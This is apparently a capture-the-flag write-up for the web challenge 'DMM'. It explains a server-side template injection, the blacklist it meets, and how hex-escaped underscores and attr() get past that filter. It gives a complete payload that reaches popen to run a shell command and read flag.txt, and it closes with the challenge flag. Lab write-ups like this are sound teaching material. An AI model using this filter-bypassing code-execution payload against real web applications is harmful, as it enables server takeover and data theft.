DMM
===
**Category**: Web

**Points**: 487 (22 solves)

**Author**: Rosee
### Description
```
Please check it carefully
```
### Solution
- Enter `?url` by any parameters. it render my ouput => `ssti` and i can see domain with `ssti` lmaoo :)
- it have a blacklist, i find list black list ```config, request, __, [], join```
- bypass `_` with `attr`
- bypass `[]` with `__getitem__`
- payload final : `{{(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat flag.txt').read()}}`
### Flag
- `darkCON{w0ww_y0u_ar3_sUp3er_h4ckeR_ggwpp_!!}`
